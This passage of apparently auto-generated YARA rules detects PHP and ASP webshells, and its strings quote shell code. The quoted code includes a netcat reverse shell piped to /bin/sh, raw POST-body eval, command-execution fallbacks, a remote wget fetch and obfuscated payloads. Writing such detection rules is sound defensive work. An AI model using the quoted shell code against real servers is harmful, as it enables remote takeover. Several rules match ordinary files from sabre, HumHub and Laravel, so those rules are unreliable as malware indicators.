      $x11 = "$c='rm -f /tmp/.ncnd; mknod /tmp/.ncnd p && nc '.$_POST['ip'].' '.$_POST['port'].' 0</tmp/.ncnd | /bin/sh 1>/tmp/.ncnd 2>&" fullword ascii
      $x12 = "$c='rm -f /tmp/.ncnd; mknod /tmp/.ncnd p && nc '.$_POST['ip'].' '.$_POST['port'].' 0</tmp/.ncnd | /bin/sh 1>/tmp/.ncnd 2>&1';" fullword ascii
      $x13 = "you could get almost-interactive shell in bind/backconnect with help of these commands<br>" fullword ascii
      $x14 = "f you see \"TERM is not set\", run command: export TERM=linux<br>//thanks to ont.rif for interactive backconnect<br>';" fullword ascii
      $x15 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">'.$style.'</head><body><script type=\"text/javascript\">'" ascii
      $x16 = "// --------------------------------------------- shell end; file operations" fullword ascii
      $x17 = "pcntl_exec($_POST[\"inter\"],array(\"-c\",\"\".$_POST[\"command\"].\" \".$_POST[\"to\"].\" \".$_POST[\"pcfile\"]));" fullword ascii
      $x18 = "//determining if pcntl enabled is kinda tricky. debug: add if(dl('pcntl.so')) or check var_dump(get_extension_funcs('pcntl')) ?" fullword ascii
      $x19 = "//determining if pcntl enabled is kinda tricky. debug: add if(dl('pcntl.so')) or check var_dump(get_extension_funcs('pcntl'))" fullword ascii
      $x20 = "site! (it could result in error 500). <br>it is recommended to create new dir and place custom .htaccess and minishells there.<" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*)
}

rule sig_258297b62aeaf4650ce04642ad5f19be25ec29c9
{
   meta:
      description = "php17 - file 258297b62aeaf4650ce04642ad5f19be25ec29c9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b4aa7508f9deba56f605ceb7fae290d5c0f9f23515fa6fe3b09fa3b1ce2eb073"
   strings:
      $s1 = "echo \"<br>Connect back Shell , bypass Firewalls<br>" fullword ascii
      $s2 = "echo \"<br><center><h3> CMD ExeCute </h3></center>\" ;" fullword ascii
      $s3 = "echo \"<br><center><h3> Fake Mail- DOS E-mail By Victim Server </h3></center>\" ;" fullword ascii
      $s4 = "//fake mail = Use victim server 4 DOS - fake mail " fullword ascii
      $s5 = "<title>SimAttacker - Version : 1.0.0 - Edited By KingDefacer</title>" fullword ascii
      $s6 = "echo \"<a href='?id=fm&fdownload=$dir$file'><span style='text-decoration: none'><font size='2' color='#008000'>download\";" fullword ascii
      $s7 = "CMD</font></span></a><font face=\"Tahoma\" size=\"2\"> Shell</font></b></p>" fullword ascii
      $s8 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword ascii
      $s9 = "//Connect Back -Firewall Bypass" fullword ascii
      $s10 = "header(\"Content-Disposition: attachment; filename=$entrypath\");" fullword ascii
      $s11 = "&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>" fullword ascii
      $s12 = "echo \"<script language='javascript'> alert('Sending Mail - please waite ...')</script>\";" fullword ascii
      $s13 = "$result=shell_exec(\"$cmd\");" fullword ascii
      $s14 = "if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {" fullword ascii
      $s15 = "//cmd-command line" fullword ascii
      $s16 = "&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>" fullword ascii
      $s17 = "header(\"Content-Length: \" . filesize($name));" fullword ascii
      $s18 = "echo \"<script language='javascript'> alert('\\:D Successfully uploaded.!')</script>\";" fullword ascii
      $s19 = "<span style=\"text-decoration: none\"><font color=\"#000000\">File Manager</font></span></a></font></span></font></b></p>" fullword ascii
      $s20 = "&nbsp;e-mail : kingdefacer@msn.com<br>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}


rule AddressBookHome
{
   meta:
      description = "php17 - file AddressBookHome.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5fdf04051e2a9464c186a13d77e282e422905d0bd33db402c932f3bf0aaf9661"
   strings:
      $x1 = "* @copyright Copyright (C) fruux GmbH (https://fruux.com/)" fullword ascii
      $x2 = "* @author Evert Pot (http://evertpot.com/)" fullword ascii
      $s3 = "* This collection contains a list of addressbooks associated with one user." fullword ascii
      $s4 = "* @license http://sabre.io/license/ Modified BSD License" fullword ascii
      $s5 = "$addressbooks = $this->carddavBackend->getAddressBooksForUser($this->principalUri);" fullword ascii
      $s6 = "* This must be a url to a principal, or null if there's no owner" fullword ascii
      $s7 = "throw new DAV\\Exception\\MethodNotAllowed('Creating new collections in this collection is not supported');" fullword ascii
      $s8 = "* Returns a single addressbook, by name" fullword ascii
      $s9 = "* Returns a list of addressbooks" fullword ascii
      $s10 = "throw new DAV\\Exception\\NotFound('Addressbook with name \\'' . $name . '\\' could not be found');" fullword ascii
      $s11 = "throw new DAV\\Exception\\MethodNotAllowed('Creating new files in this collection is not supported');" fullword ascii
      $s12 = "* Creates a new address book." fullword ascii
      $s13 = "* @throws DAV\\Exception\\InvalidResourceType" fullword ascii
      $s14 = "* Creates a new directory under this object." fullword ascii
      $s15 = "* @return AddressBook" fullword ascii
      $s16 = "* @var Backend\\BackendInterface" fullword ascii
      $s17 = "* Creates a new file under this object." fullword ascii
      $s18 = "* This is currently not allowed." fullword ascii
      $s19 = "* Updates the name of this object" fullword ascii
      $s20 = "* Returns the name of this object" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule sig_41780a3e8c0dc3cbcaa7b4d3c066ae09fb74a289
{
   meta:
      description = "php17 - file 41780a3e8c0dc3cbcaa7b4d3c066ae09fb74a289.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "885838c306798d11ca317627a98d94c7c1c30522a6d5d6a0c897560919ed4ffe"
   strings:
      $x1 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$ret = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x2 = "elseif(function_exists('system')){@ob_start();@system($cmd);$ret = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $s3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - FaTaL Shell v1.0 - Edited By KingDefacer</title><meta http-equiv=\"Conte" ascii
      $s4 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - FaTaL Shell v1.0 - Edited By KingDefacer</title><meta http-equiv=\"Conte" ascii
      $s5 = "document.reqs.submit();\">| Shell </a></td><td><a href=\"#\" onclick=\"document.reqs.action.value='viewer';" fullword ascii
      $s6 = "$act=array('viewer','editor','upload','shell','phpeval','download','delete','deletedir');//here added new actions" fullword ascii
      $s7 = "elseif(@is_resource($f = @popen($cmd,\"r\"))){$ret = \"\";while(!@feof($f)) { $ret .= @fread($f,1024); }@pclose($f);}" fullword ascii
      $s8 = "if(function_exists('exec')){@exec($cmd,$ret);$ret = join(\"\\n\",$ret);}" fullword ascii
      $s9 = "elseif(function_exists('shell_exec')){$ret = @shell_exec($cmd);}" fullword ascii
      $s10 = "<a href=\"http://alturks.com\">COPYRIGHT 2010 - Edited By KingDefacer <?=$version;?></a></td></tr></table></tr></td></table><?=$" ascii
      $s11 = "<a href=\"http://alturks.com\">COPYRIGHT 2010 - Edited By KingDefacer <?=$version;?></a></td></tr></table></tr></td></table><?=$" ascii
      $s12 = "| Edit File</a></td><td><a href=\"#\" onclick=\"document.reqs.action.value='upload';document.reqs.dir.value='<?=$dir;?>';" fullword ascii
      $s13 = "<a href=\"#\" onclick=\"document.reqs.action.value='shell';document.reqs.dir.value='<?=$dir;?>';" fullword ascii
      $s14 = "<form name='reqs' method='POST'><input name='action' type='hidden' value=''><input name='dir' type='hidden' value=''> <input na" fullword ascii
      $s15 = "if(!isset($_POST['filename'])) $uploadfile = $dirupload.basename($_FILES['file']['name']); else " fullword ascii
      $s16 = "n'].\" -o \".$_POST['filename'].\"\");break;}}}?> " fullword ascii
      $s17 = "document.reqs.submit();\">| Upload File</a></td><td><a href=\"#\" onclick=\"document.reqs.action.value='phpeval';" fullword ascii
      $s18 = "$content.=\"<table cellSpacing=0 border=1 style=\\\"border-color:black;\\\" cellPadding=0 width=\\\"100%\\\">\";" fullword ascii
      $s19 = "<-Back |</a></td><td><a href=\"#\" onclick=\"history.forward();\"> Next->|</a></td></tr></table></td></tr></table><br>" fullword ascii
      $s20 = "(@ini_get('safe_mode')==\"1\" ? $safe_mode=\"ON\" : $safe_mode=\"OFF(Rootla_Beni:)\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule AccountMenu
{
   meta:
      description = "php17 - file AccountMenu.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "80cfa40546eda29f789dbbaa577ac5bb73ec1e21d03d279e1d765d8993ac0d7d"
   strings:
      $x1 = "* AccountMenuWidget as (usally left) navigation on users account options." fullword ascii
      $s2 = "* @license https://www.humhub.com/licences" fullword ascii
      $s3 = "* @package humhub.modules_core.user.widgets" fullword ascii
      $s4 = "public $template = \"@humhub/widgets/views/leftNavigation\";" fullword ascii
      $s5 = "'label' => Yii::t('UserModule.widgets_AccountMenuWidget', '<strong>Account</strong> settings')," fullword ascii
      $s6 = "* @link https://www.humhub.org/" fullword ascii
      $s7 = "if (count(Yii::$app->user->getIdentity()->getAvailableModules()) != 0) {" fullword ascii
      $s8 = "'label' => Yii::t('UserModule.widgets_AccountMenuWidget', 'Modules')," fullword ascii
      $s9 = "'label' => Yii::t('UserModule.widgets_AccountMenuWidget', 'Settings')," fullword ascii
      $s10 = "* @copyright Copyright (c) 2015 HumHub GmbH & Co. KG" fullword ascii
      $s11 = "'label' => Yii::t('UserModule.widgets_AccountMenuWidget', 'Profile')," fullword ascii
      $s12 = "'label' => Yii::t('UserModule.widgets_AccountMenuWidget', 'Security')," fullword ascii
      $s13 = "'isActive' => ($controllerAction == \"edit\" || $controllerAction == \"change-email\" || $controllerAction == \"change-pa" fullword ascii
      $s14 = "namespace humhub\\modules\\user\\widgets;" fullword ascii
      $s15 = "* @author Luke" fullword ascii
      $s16 = "// Only show this page when really user specific modules available" fullword ascii
      $s17 = "'label' => Yii::t('UserModule.account', 'E-Mail Summaries')," fullword ascii
      $s18 = "use \\humhub\\widgets\\BaseMenu;" fullword ascii
      $s19 = "'url' => Url::toRoute('/user/account/edit-settings')," fullword ascii
      $s20 = "'url' => Url::toRoute('//user/account/edit-modules')," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule sig_7304d0048d5c31a821a27251763c6bb182f48826
{
   meta:
      description = "php17 - file 7304d0048d5c31a821a27251763c6bb182f48826.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9a4a084309f51684ca86a1a5fac5a5c0951d5e82a407308ad09b69c6dcaca32b"
   strings:
      $s1 = "VRmRLYUdNeVZUSk9SamxyV2xkT2RscEhWVzlKYkc5NlkwaENhV0pXY0hwWFZtaFRZa05KY0U5M1BUMGlLU2s3WlhaaGJDaGlZWE5sTmpSZlpHVmpiMlJsS0NKS1NHaGF" ascii
      $s2 = "ZalpvTkU0dVBTUjROM04wTnpsV1ZuSjJVaWdvSkhoWGVFYzVlalEwVHpCd0tDUjRXVVY2UkhVMmNqTkZXbFJiSkhoc2RGVnNRMkkxUjNoelhTbGVNakV5T1RRd05USXd" ascii
      $s3 = "VRmRLYUdNeVZUSk9SamxyV2xkT2RscEhWVzlKYkd4MFVtNXdZVlpHYTNkWFJFcFRZa1pyZVU5WGRHRlZWREE1U1dsck4wcElhRWhrTTFKTlVraGtkMVJHU2pSTlZERnB" ascii
      $s4 = "QU2NuTzJadmNpZ2tlR3gwVld4RFlqVkhlSE05TURza2VHeDBWV3hEWWpWSGVITThKSGhpV0VGalIyNWFZbEJsT3lSNGJIUlZiRU5pTlVkNGN5c3JLWHNrZUhOV2FWUlB" ascii
      $s5 = "XVmhPYkU1cVVtWmFSMVpxWWpKU2JFdERTbXBOTVVvMVdXdGtWMlJUU1hCUGVWSTBUak5PTUU1NmJGZFdia295VldveGFWbFlUbXhPYWxKbVdrZFdhbUl5VW14TFEwcGF" ascii
      $s6 = "UVzFvTlVscGF6ZEtTR2hZWlVWak5XVnFVVEJVZWtKM1VGZEthR015VlRKT1JqbHJXbGRPZGxwSFZXOUpiVWw2VTIxemFVdFVjMnRsUjFaTlpFZGtlR0ZJWkVwV01HZDR" ascii
      $s7 = "VbGh3UldSVVdubE5NRlpoVmtRd2EyVkdiM2hoYmxwWlRtcFJNRnB1VVc5S1NHaGFVbGh3UldSVVdubE5NRlpoVmtOck4wcElhR2xYUlVacVVqSTFZVmxzUW14UVUxSTB" ascii
      $s8 = "Vak5rTUZSRlVqTmpSWGhUWlVSRmIwcElhRnBTV0hCRlpGUmFlVTB3Vm1GV1EyczNJaWtwT3c9PSIpKTtldmFsKGJhc2U2NF9kZWNvZGUoIkpIaHpWbWxVVDJJMmFEUk9" ascii
      $s9 = "$auth_pass = \"63a9f0ea7bb98050796b649e85481845\";" fullword ascii
      $s10 = "OQ2twTzMxbGRtRnNLQ1I0YzFacFZFOWlObWcwVGlrNyIpKTs=\"));" fullword ascii
      $s11 = "H0/KSY9NG8ZHjQ0NDQ0NDB4e3g6KXd8Zjx8cWxwcXc8Z2F2Z2BmPDB5dX9xYWQ4MH04Jj09PS8ZHjQ0NDRpGR40NDQ0ZnFgYWZ6NDB4e3gvGR5pGR4wZ3F9d3t4fXp/K" ascii
      $s12 = "SEnICEnLSIsIHAjdSEhIyYhdSEiICInIiIgInAnLSF1ISUhIyF1InAgcSAjISEjdSIlISIhdSIsISAicCJ3JyIhdScmJy0nJSIhIi0jICcmIiUicCInJychISAgIncnI" ascii
      $s13 = "CEjICwiIycnIXUhISAiIi0gciAsIyQhdSBxICIgJiAhIicicCIsISUiJSEhISIgLSIhISwicicgISIgICEiICwhIyJwISIhICInICIiLCEtIHIgIychIywgcScmIyAid" ascii
      $s14 = "CInInAjLCEsISMicSIjJyAhIiEnJy0idSBxICMhdSciIiYgIyEmIywiICEsIyQgLCEjICIhdSMkIiUnJCEmJyAhJyJwISUnJyEhISMhIiAnISMgIiBxIyQhJSJ2JyEjI" ascii
      $s15 = "CByISMhdSclIHAnJiAiJyIhdSAhIycjdSEjICMhdSAtISMiLSMgInchJSEjIHAnISIlI3UhdSMsIS0nJCclIHEhISEhIHEjJyBxJychJScnIiEgICIsInciICJ2ISUjI" ascii
      $s16 = "iF1ISAiIyMjIHIhISMgISMhJSclIHEhLCIgISEnJScgIiAhJyctICYgciAgICIhJyIlICwjJCJwIHEhIyEmJyQhLSEgIiwjJiEnICwhIiJ2IicnJCckIy0hICcnIiMnJ" ascii
      $s17 = "SEtInAhJiAnIiEgJyMgIHYgcSckIiAhJyEhICwidyB3ISEhICIsICYiISAhISEnJyF1ICEiICB3ISAicCEiISchISEjJy0idyIgIy0nLSciISchICF1ICIhJSJ1ISIgJ" ascii
      $s18 = "CByICMhdScgIS0idiF1ICEhJiAjICIiLCEgISIhJiMgIHIgIyMgISIgciAsICUnICImInciIyckIHAhIyIsISAiISAhICIhIyEmInAhJiB2IiEhIyMkISMhJyEjIiAjL" ascii
      $s19 = "SBwICMidyMjIS0nJyBxIHAiJyJ1ICIhICInJyciJychIiAhIiJyJyUiJyJ3ISYiLCEmI3UhdScnIHAidSAtJyQiISEgISIjdSIgJyUgdSN1IiAhIyAiIHEhISJ2Iiwid" ascii
      $s20 = "SEiICIgcSIsISYgLCIsJyYgcSAnJy0icCInInUhJScgISEgISIsICwiJSEjIXUjIyBwISMjJCMtIHcjdSF1I3UgciAjISIhJSEnICwhdSAjIicgISIgInUiISEiISEnI" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule php17_529
{
   meta:
      description = "php17 - file 529.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d95e433f0afcee7afe71cb7f1271248341fea1672ae9aa06fa67676f4acfeaf8"
   strings:
      $s1 = "href=\"/\" title=\"Securityhouse\">Security House - Shell Center - Edited By KingDefacer</a> labs. " fullword ascii
      $s2 = "<p><form name=\"form\" action=\"http://'.$_SERVER[\"HTTP_HOST\"].htmlspecialchars($_SERVER[\"SCRIPT_N " fullword ascii
      $s3 = "bypass shell:" fullword ascii
      $s4 = "<p>More: <a href=\"/\">Md5Cracking.Com Crew</a> " fullword ascii
      $s5 = "safe_mode and open_basedir Bypass PHP 5.2.9 " fullword ascii
      $s6 = "<p>PHP 5.2.9 safe_mode & open_basedir bypass " fullword ascii
      $s7 = "<p><b> [Turkish Security Network] - Edited By KingDefacer" fullword ascii
      $s8 = "else if(!empty($_POST['file'])) $file=$_POST['file']; " fullword ascii
      $s9 = "if(FALSE==curl_exec($ch)) " fullword ascii
      $s10 = "if(!empty($_GET['file'])) $file=$_GET['file']; " fullword ascii
      $s11 = "if(!file_exists(\"file:\")) " fullword ascii
      $s12 = "mkdir(\"file:\"); " fullword ascii
      $s13 = "echo '<FONT COLOR=\"RED\"> <textarea rows=\"40\" cols=\"120\">'; " fullword ascii
      $s14 = "chdir(\"file:\"); " fullword ascii
      $s15 = "echo '<PRE><P>This is exploit from <a " fullword ascii
      $s16 = "This Exploit Was Edited By KingDefacer" fullword ascii
      $s17 = "type=\"submit\" name=\"hardstylez\" value=\"Show\"></form>'; " fullword ascii
      $s18 = "curl_setopt($ch, CURLOPT_URL, \"file:file:///\".$file); " fullword ascii
      $s19 = "die('>Sorry... File '.htmlspecialchars($file).' doesnt exists or you dont have permissions.'); " fullword ascii
      $s20 = "AME\"]).$_SERVER[\"PHP_SELF\"].'\" method=\"post\"><input type=\"text\" name=\"file\" size=\"50\" value=\"'.htmlspecialchars($fi" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}


rule sig_8f344c64119f2c2fa0f741befc6cafde63a18e45
{
   meta:
      description = "php17 - file 8f344c64119f2c2fa0f741befc6cafde63a18e45.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e77097cca2e4e185bd47ef61940581ac560992fcceddab47d60341685d86ee31"
   strings:
      $s1 = "eval(file_get_contents('php://input'));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2015_12_19_143643_add_sortable
{
   meta:
      description = "php17 - file 2015_12_19_143643_add_sortable.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "48e04a20c36e83c6f7764785c08e981e6f5d9bb075626e4c47aec3fde60d64ac"
   strings:
      $s1 = "Schema::table('media__imageables', function (Blueprint $table) {" fullword ascii
      $s2 = "$table->integer('order')->nullable()->after('zone');" fullword ascii
      $s3 = "$table->dropColumn('order');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule a6e7d46a4f541284dcd6ce60d7dd981bb2c69d69
{
   meta:
      description = "php17 - file a6e7d46a4f541284dcd6ce60d7dd981bb2c69d69.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "18e701b828d3f3396885717ac095be950f493548f33d01f96a54b4e9b8621404"
   strings:
      $s1 = "echo $_GET[c];" fullword ascii
      $s2 = "$cb= 'system';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_78164ca7320172aa0b9e85d3c581c351fb56be53
{
   meta:
      description = "php17 - file 78164ca7320172aa0b9e85d3c581c351fb56be53.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "86104c68cb7b3a6d8419220e377a0418dcafe537f4c8401926a2132a5794a1e8"
   strings:
      $s1 = "<?php eval(gzuncompress(\"x" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php17_2
{
   meta:
      description = "php17 - file 2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d8dffbed7304a0f2c045899b0053446bed3df2a9beaf8b460a0f9439b0ad9265"
   strings:
      $s1 = "//usage: ?z=phpinfo();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php17_aspydrv
{
   meta:
      description = "php17 - file aspydrv.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "58940c0ea029b6b277fd16820be53a78c971c5d30fbe8bec2147399c6d89adb7"
   strings:
      $x1 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files will be DUMPED Too and From" fullword ascii
      $s2 = "fso.CopyFile Request.QueryString(\"txtpath\") & \"\\\" & Request.Form(\"Fname\"),Target & Request.Form(\"Fname\")" fullword ascii
      $s3 = "fso.CopyFile Target & Request.Form(\"ToCopy\"), Request.Form(\"txtpath\") & \"\\\" & Request.Form(\"ToCopy\")" fullword ascii
      $s4 = "<!-- Copyright Vela iNC. Apr2003 [alturks.com] Edited By KingDefacer-->" fullword ascii
      $s5 = "Response.write \"<font face=arial size=-2>You need to click [Create] or [Delete] for folder operations to be</font>\"" fullword ascii
      $s6 = "<form method=post name=frmCopySelected action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
      $s7 = "<BR><center><form method=post action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
      $s8 = "<table><tr><td><%If Request.Form(\"chkXML\") = \"on\"  Then getXML(myQuery) Else getTable(myQuery) %></td></tr></table></form>" fullword ascii
      $s9 = "<form method=\"post\" action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>\" name=\"myform\" >" fullword ascii
      $s10 = "oUploadFile.ContentType = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))" fullword ascii
      $s11 = "Response.Write \"<tr><td><font color=gray>Type: </font></td><td>\" & File.ContentType & \"</td></tr>\"" fullword ascii
      $s12 = "<BR><input type=text width=40 size=60 name=txtpath value=\"<%=showPath%>\" ><input type=submit name=cmd value=\"  View  \" >" fullword ascii
      $s13 = "Document.frmSQL.txtSQL.value = \"select name as 'TablesListed' from sysobjects where xtype='U' order by name\"" fullword ascii
      $s14 = "<INPUT TYPE=\"SUBMIT\" NAME=cmd VALUE=\"Save As\" TITLE=\"This write to the file specifed and overwrite it without warning.\">" fullword ascii
      $s15 = "<input type=submit name=cmd value=Create><input type=submit name=cmd value=Delete><input type=hidden name=DirStuff value=@>" fullword ascii
      $s16 = "<INPUT type=password name=code ></td><td><INPUT name=submit type=submit value=\" Access \">" fullword ascii
      $s17 = "Document.frmSQL.txtSQL.value = \"SELECT * FROM \" & vbcrlf & \"WHERE \" & vbcrlf & \"ORDER BY \"" fullword ascii
      $s18 = "<form name=frmSQL action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?qa=@\" method=Post>" fullword ascii
      $s19 = "<FORM method=\"post\" action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>\" >" fullword ascii
      $s20 = "if RS.properties(\"Asynchronous Rowset Processing\") = 16 then" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule php17_40004
{
   meta:
      description = "php17 - file 40004.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b01b319140874a26e78487a5ff83379378506c69136eebc089e3075751376a21"
   strings:
      $s1 = "<address>Apache Server at \".$_SERVER[\"HTTP_HOST\"].\" Port 80 </address>" fullword ascii
      $s2 = "$password = \"88f078ec861a3e4baeb858e1b4308ef0\";" fullword ascii
      $s3 = "if(!isset($_SESSION['ses']) or $_SESSION['ses'] != $password)" fullword ascii
      $s4 = "$chk_login = 1;" fullword ascii
      $s5 = "if($chk_login)" fullword ascii
      $s6 = "$psw = trim($_POST['pass']);" fullword ascii
      $s7 = "<input type=password name=pass>" fullword ascii
      $s8 = "if($pass == $password)" fullword ascii
      $s9 = "zwDWzY6U91Mo9rXwxumlPU6nTrd6Z1KmtNS9FeYAUt6lNapOW0ZAE8bBZKRmlrf7dSePg6NxSuuNybnh6Md4pKTeV0zvuQcjVdFG7FfrKVsbIn5x2WyVluF0xuxe5q+6" ascii
      $s10 = "e an ErrorDocument to handle the request.</p>" fullword ascii
      $s11 = "input { margin:0;background-color:#fff;border:1px solid #fff; }" fullword ascii
      $s12 = "cTqO/t8jHnabgE2Yv6kZMW1iqxAQv2l/N491OUisQq+dOCcPWkbGRwTbn5+zAX/zNX/7vX/3Pv/3Nn/zib//zc52IJTMkTh7ZmL0Tnsqw8zIh9trlh0ZBOhk9+Xp2EAR" ascii
      $s13 = "JnSgYoqwx6PwE0xA1VRxAq4jJW9SFyBAukjdsGUPqiQQVCdpnm0omA4KfZYTxlJgdYRaMBgvbPp81waDxJ7/+T/9nZtRhR62eJGuyK0eVFRTzz//s3/7fYNj2Td7XwWq" ascii
      $s14 = "zKmR88EQodkZFLbdnmKB//fUBtX54WUDEkJhi+oLXhmjdwX30110wepBhAKwu7ud34RGG7MNgnnp4YCBdwvxlgPFIQ4BxVggYF4faYrO+TGZdyfglAZqxeEuBJKHiFWB" ascii
      $s15 = "$pass = md5(md5(md5($pass)));" fullword ascii
      $s16 = "$_SESSION['ses'] = \"$pass\";" fullword ascii
      $s17 = "dD/IKnDNWXagnSAdCL6Jsbnk8RpK5vIvrS9qxjFNWsXsDlEQP63V49lCvFrqIuYOCh0GbGpMwBpwCGNYdc2iLcoCpuAgR7rNlNOGksjBGZRLzoWXUGoBmCJM0TNlkKUG" ascii
      $s18 = "G/tBJdad2+qBpiLnDXKXTf5S3e2f1zFixNnU0Bqy5x+fixbF1dN0Ycy1nMLKkfHbNnpinFcmS7NGd0j+QjZQ8QRYoZ1SymQ21tYkAUuVxLrX5IDwqp2d5tVq1hqeXwrh" ascii
      $s19 = "M/7Be6auZ6bFydnvz1Bv3Offi8VQeuqnp6cmFen2w4QxulX7uThbPKy1D03unp/bThtmr3mwpucbdSe7wWr+uCmbLeapvP0yeLg+ddH2nKV1WrgaHnJyaOKn+4Na5yB8" ascii
      $s20 = "ug1i56kHtv/6zv/z5L//pr//7f/g3b+IcLkPiHFGKsPKmQbpZPaGSLEi6arzrddVk3xyFaonY6isMhznpmnPV95tUATuvvPPv7Imoy9l6YBkIagKv30o1jmVNM/9JiDQ" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule a5c2dcfaba591c4f57de219e66eb0d3ea9d06174
{
   meta:
      description = "php17 - file a5c2dcfaba591c4f57de219e66eb0d3ea9d06174.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9a3ac5f1bb8152c9e24f9d66a1975bf9b8968eb719074a5bc9a0dcef3b7d6df6"
   strings:
      $x1 = "background:url(http://yahoo21.persiangig.com/sheller/style/images/login-header.png) no-repeat 0 0 transparent; " fullword ascii
      $x2 = "background:url(http://yahoo21.persiangig.com/sheller/style/images/login-blank.png) no-repeat 0 0 transparent; " fullword ascii
      $x3 = "<a href=\"http://www.mozilla.com/en-US/\" id=\"firefox\" target=\"_blank\"></a>" fullword ascii
      $x4 = "<iframe src=\"http://elhamit77.persiangig.com/sheller/message.html\" width=\"260px\" frameborder=\"0\"></iframe>" fullword ascii
      $x5 = "echo \"<b>Your ip: <a href=http://whois.domaintools.com/\".$_SERVER[\"REMOTE_ADDR\"].\">\".$_SERVER[\"REMOTE_ADDR\"].\"</a> - Se" ascii
      $x6 = "background-image:url('http://yahoo21.persiangig.com/sheller/style/images/logo.png');" fullword ascii
      $x7 = "background:url(http://yahoo21.persiangig.com/sheller/style/images/notice.png) no-repeat 0 0 transparent; " fullword ascii
      $s8 = "background-image:url('http://yahoo21.persiangig.com/sheller/style/images/rss.png');" fullword ascii
      $s9 = "background-image:url('http://yahoo21.persiangig.com/sheller/style/images/bg.jpg');" fullword ascii
      $s10 = "background-image:url('http://yahoo21.persiangig.com/sheller/style/images/news.png');" fullword ascii
      $s11 = "background-image:url('http://yahoo21.persiangig.com/sheller/style/images/mbg.png');" fullword ascii
      $s12 = "/ This Sheller Design And Coded By: Mr.Amir-Masoud" fullword ascii
      $s13 = "background-image:url('http://yahoo21.persiangig.com/sheller/style/images/msg.png');" fullword ascii
      $s14 = "background-image:url('http://yahoo21.persiangig.com/sheller/style/images/stats.png');" fullword ascii
      $s15 = "This Shell Coded By: Mr.Amir-Masoud !<br />" fullword ascii
      $s16 = "<script type=\"text/javascript\" src=\"http://code.jquery.com/jquery-latest.pack.js\"></script>" fullword ascii
      $s17 = "<!-- Begin ParsTools.com RSSREADER Code --><script language=\"javascript\" src=\"http://parstools.com/rss/?url=http://www.sepehr" ascii
      $s18 = "<!-- Begin ParsTools.com RSSREADER Code --><script language=\"javascript\" src=\"http://parstools.com/rss/?url=http://www.sepehr" ascii
      $s19 = "$source = 'http://yahoo21.persiangig.com/sheller/cgi.pl';" fullword ascii
      $s20 = "$source = 'http://yahoo21.persiangig.com/sheller/ddos.txt';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule sig_70fe072e120249c9e2f0a8e9019f984aea84a504
{
   meta:
      description = "php17 - file 70fe072e120249c9e2f0a8e9019f984aea84a504.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "49839366d5f1b15ed9c222aa11bfe0d8aa96250944a8db6d8a0024509b780376"
   strings:
      $x1 = "$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent" fullword ascii
      $x2 = "$act = array('cmd'=>'Command Execute','files'=>'File View','phpinfo'=>'PHP info', 'phpexec'=>'PHP Execute'," fullword ascii
      $x3 = "if(exec(\"wget $file -b -O $updir/$filex\")){die(\"File has been uploaded.\");}" fullword ascii
      $x4 = "req = urllib2.Request('http://www.seologs.com/ip-domains.html', urllib.urlencode({'domainname' : sys.argv[1]}))" fullword ascii
